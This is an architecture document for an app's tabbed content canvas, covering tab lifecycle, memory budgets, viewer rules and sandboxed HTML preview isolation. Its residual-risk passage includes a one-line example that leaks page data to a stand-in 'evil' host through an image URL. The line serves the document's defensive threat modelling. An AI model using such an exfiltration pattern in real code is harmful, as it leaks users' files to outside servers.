# Content Canvas

The tabbed pane beside the chat that shows files, web pages, terminals, teams
and goals. One `canvasLifecycle` (`services/canvas-lifecycle.ts`) owns every
tab and every native resource behind one (BrowserViews, file content, pty
attachment); React renders what it says.

## Parts

| Part | File | Owns |
|---|---|---|
| Lifecycle manager | `services/canvas-lifecycle.ts` | tabs (`TabState`), active tab, open state, BrowserView create/show/hide/destroy, file reads, disk-change handling, budgets |
| Budget planner | `services/canvas-budget.ts` + `shared/constants/canvas-budget.ts` | which hidden tabs give up content, views, or close |
| React bindings | `hooks/useCanvasLifecycle.ts` | `useTabList`, `useActiveTab`, `useActiveTabId`, `useCanvasIsOpen`, `useTabCount`, `useBrowserState`, `useCanvasActions` |
| Legacy store proxy | `stores/canvas.store.ts` | open/maximized state for pages outside the canvas; budget-eviction toast |
| Host | `ContentCanvas.tsx` | tab bar, keyboard shortcuts, `TabContent` (loading/error states + `ViewerHost` boundary) |
| Registry | `viewer-registry.tsx` | `VIEWERS: Record<ContentType, ViewerSpec>`, `viewerFor(type)` |
| Viewer resources | `viewer-resources.ts` | `DisposableStore`, `useViewerResources()` |
| Viewers | `viewers/*` | rendering one tab |

## Tab state and notifications

`TabState` objects are immutable: every change replaces the object, so
identity says whether anything changed. The one exception is `tab.view`, a
view memory (scroll offset) that viewers write without notification and that
every snapshot of the tab shares.

Notifications are split by what changed, so each subscriber re-renders only
for what it shows:

| Channel | Fires on | Consumers |
|---|---|---|
| `onTabListChange` | add / remove / reorder, or a field in `TAB_LIST_FIELDS` (type, title, path, url, dirty, loading, error) | tab strip, tab count, telemetry, goal titles |
| `onTabChange(tab)` | any change to one tab | `useActiveTab` (re-renders only when the active tab's object changed) |
| `onBrowserStateChange(tabId)` | a BrowserView's navigation state | `useBrowserState(tab.id)` |
| `onActiveTabChange`, `onOpenStateChange` | active tab / open state | host |

`getTabs()` is always current; `getTabListSnapshot()` is the tab strip's stable
array and may lag on fields the strip does not show.

## Files changing on disk

The lifecycle consumes `artifact:changed-batch` (`'change'` and `'add'`, the
latter for atomic temp+rename writers; `resync` = every file tab):

- A clean tab re-reads **in place** — the viewer stays mounted and swaps the
  text. The editor applies it with `addToHistory: false`: an outside
  replacement is not undoable and never costs a whole-document copy in
  history.
- A tab with unsaved edits is never overwritten. The file is read and
  compared with `savedContent` (the disk text as of the first edit); only a
  real divergence sets `diskConflict`, and the editor asks: load the disk
  version, or keep my edits (a save then overwrites). Our own save echoing
  back is not a conflict.

## Budgets

Applied after every activation and every new BrowserView
(`shared/constants/canvas-budget.ts`), least recently activated first:

| Budget | Default | Over it |
|---|---|---|
| `MAX_OPEN_TABS` | 30 | close the tab; the user sees a toast |
| `MAX_LIVE_BROWSER_VIEWS` | 6 | destroy an owned hidden BrowserView, keep its url; recreated when shown |
| `HIDDEN_CONTENT_BUDGET_BYTES` | 64 MB | drop a hidden file tab's content/bytes (`contentUnloaded`); re-read when shown |

Never touched: the active tab, tabs with unsaved edits, terminals (closing
would end or prompt about a live pty), AI-attached browser views (the AI's
session outlives the tab), and content that cannot be re-read (no path).

Memory pressure (`app:memory-pressure`, from the main process health sampler)
at `critical` applies the budgets with zero allowance for hidden content and
hidden views. Tabs themselves stay; everything reloads on activation.

## Canvas Viewer rules

Rules marked ⚙ are enforced by `tests/unit/architecture/canvas-viewers.guard.test.ts`.

1. ⚙ **One instance per tab.** The host mounts `<TabContent key={tab.id}>`.
   Switching tabs remounts the viewer, so no editor history, edit mode or UI
   state crosses tabs. A viewer never has an effect keyed on `tab.id` (it
   would be dead code or a sign of reuse).
2. ⚙ **Imperative resources are registered.** Workers, observers,
   `EditorView`/`Terminal` instances, `api.on*` subscriptions, pdf loading
   tasks, object URLs and intervals are created inside
   `resources.add(...)` / `scope.add(...)` from `useViewerResources()`. The
   store releases newest-first on unmount, and anything added after that (a
   late async result) is released on arrival. An effect that recreates
   resources takes a `scope()` and disposes it in its cleanup.
3. ⚙ **No global canvas state in viewers.** A viewer reads its `tab` prop,
   `useBrowserState(tab.id)` and `useCanvasActions()` (stable functions) —
   never `useTabList`/`useActiveTab`/the canvas store, and only type imports
   from the lifecycle or store.
4. **Large content is not derived in render.** Anything O(n) over
   `tab.content`/`tab.bytes` (split, parse, chunk) is memoized on the content
   or runs in a worker; counts use `countLines()` instead of `split`.
5. **Outside refresh is not undoable and never overwrites edits** (see above).
6. **State that must survive a switch lives on the tab.** Scroll offset in
   `tab.view`; unsaved edits, the saved baseline and edit mode (derived from
   `isDirty`) on `TabState`. Component state holds only what may reset on
   remount (copied, saving, hover).
7. ⚙ **The host owns boundaries.** Every viewer renders inside `ViewerHost`
   (per-tab `ErrorBoundary` + `Suspense`); viewers do not add their own.
8. **Hidden = unmounted.** No viewer stays mounted while hidden. Keep-alive
   needs a registry flag bounded by a small cap, added together with its first
   real consumer — not before.
9. ⚙ **Registry, not switch.** `VIEWERS` is `Record<ContentType, ViewerSpec>`;
   the host has no switch over types and imports no viewer. An unknown type
   (e.g. from a newer main process) resolves to the text viewer, and
   `openFile` normalizes it to `'text'`.
10. **Notifications by granularity** (see the table above); there is no
    catch-all "tabs changed" event.

## HTML preview isolation

Generated HTML is untrusted. It never runs in the app origin:

| Where | Frame | Origin / process | Relative URLs | Remote resources |
|---|---|---|---|---|
| Desktop, file on disk | `src="halo-preview://<random host>/<file>"`, sandbox + `allow-same-origin` | its own site → out-of-process frame, no preload bridge, own storage | served natively from the file's directory tree only (`..`, encoded traversal and symlinks out of it are refused) | its own CSP (`PREVIEW_DOCUMENT_POLICY`): https: scripts/styles/images/fonts, same-origin fetches only (`connect-src 'self'`, `form-action 'self'`); never `halo-file:`, other previews or the app |
| No file (generated content), remote clients, preview origin unavailable | `srcdoc`, sandbox **without** `allow-same-origin` | opaque; inherits the app CSP | `<base href="halo-file://<dir>/">` when a local file exists (images only — the inherited CSP blocks scripts/styles from it) | per the app CSP |

The main process (`foundation/protocol.service.ts`) maps each preview host to
one directory; the viewer asks for a host on mount (`canvas-preview:open`) and
releases it on unmount through its resource store. Top navigation, popups
escaping the sandbox, and plugins stay blocked in both modes.

What the preview origin will and will not serve:
- Never a dot-file or dot-directory (`.ssh`, `.env`, `.git`), including one
  reached through a visible symlink, and never a hidden file as the page itself.
- Not offered at all — the viewer previews in srcdoc instead — when the file's
  directory is the filesystem root, the home directory or an ancestor of it, or
  contains the Halo data directory or the app's userData. `report.html` saved in
  `~` or `/` therefore never gets a site that spans the user's files. Halo's own
  artifact folder (inside the data directory) is served: it does not contain it.
- Script in the page can read what the server exposes but cannot send it
  anywhere with fetch/XHR/WebSocket/form posts (`'self'` only).
- Each preview's storage (localStorage, IndexedDB, cache, cookies) is erased
  when its preview closes or is evicted by the 64-host cap. Accepted residual:
  previews open when the app crashes keep their (small) storage, since the
  random origin needed to clear it is gone.

Residual risk, accepted: https: is allowed for scripts, styles, images, fonts,
frames and (sandbox `allow-popups`) popups, and any of those is a GET the page
controls (`new Image().src = 'https://evil/?' + data`). A page can therefore
still leak the non-hidden files of its own directory tree to a server it names,
by URL. The directory scoping above is what bounds this: a page can only
exfiltrate what sits beside the HTML file it came from.

Rules:
- ⚙ A `srcdoc` frame never has `allow-same-origin`; only the preview-origin
  frame (loaded by `src`) may, because its origin is its own site.
- `halo-file://` is served inert as a document (`CSP: sandbox`) and must not be
  added to the app CSP's `connect-src`/`frame-src`/`script-src`. The app CSP's
  `frame-src` allows `halo-preview:` and nothing else beyond `'self'`.
- Any new preview surface for untrusted documents uses the preview origin, not
  a same-origin frame.

## Adding a viewer

- [ ] Add the content type to `CONTENT_TYPES`; the compiler lists the registry entry to add.
- [ ] Register it in `viewer-registry.tsx` (lazy import for heavy parsers; `ownsLoading`/`ownsError` if it renders those itself).
- [ ] Take `ViewerProps` (use the subset you need); no canvas store/hook imports.
- [ ] Every imperative resource through `useViewerResources()`.
- [ ] Derivations memoized; lists over ~128k chars virtualized (chunk Virtuoso / TableVirtuoso / CodeMirror viewport).
- [ ] Scroll/view memory in `tab.view`, not component state.
- [ ] Native resources (BrowserView, pty, worker pool) get a single release point in the lifecycle and a budget entry.
- [ ] Third-party renderer: count `createObjectURL`/`revokeObjectURL` and listener add/remove; unpaired ones get a `patches/` fix plus a guard (docx-preview, xterm).
- [ ] Unit tests for its pure logic; a `tests/perf` scenario if it can hold large content.
